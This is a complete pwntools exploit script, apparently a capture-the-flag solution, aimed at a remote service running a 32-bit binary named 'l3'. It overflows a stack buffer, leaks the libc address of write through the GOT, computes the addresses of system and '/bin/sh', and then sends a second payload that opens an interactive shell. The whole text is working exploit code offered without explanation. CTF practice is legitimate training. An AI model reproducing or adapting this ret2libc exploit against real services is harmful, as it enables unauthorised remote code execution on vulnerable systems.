from pwn import *
#p=process('./l3')
p=remote('111.198.29.45',42699)
e=ELF('./l3')
libc=ELF('libc_32.so.6')
#libc=ELF('/usr/lib/i386-linux-gnu/libc-2.29.so')
write_got=e.got['write']
write_plt=e.plt['write']
vul_addr=e.symbols['vulnerable_function']
p.recvuntil("Input:\n")
payload1='a'*(0x88+0x4)+p32(write_plt)+p32(vul_addr)+p32(1)+p32(write_got)+p32(4)
p.sendline(payload1)
temp=p.recv(4)
write_addr=u32(temp[0:4])
libcbase=write_addr-libc.symbols['write']
sys_addr=libcbase+libc.symbols['system']
bin_sh=libcbase+libc.search('/bin/sh').next()
p.recvuntil("Input:\n")
payload2='a'*(0x88+0x4)+p32(sys_addr)+'aaaa'+p32(bin_sh)
p.sendline(payload2)
p.interactive()
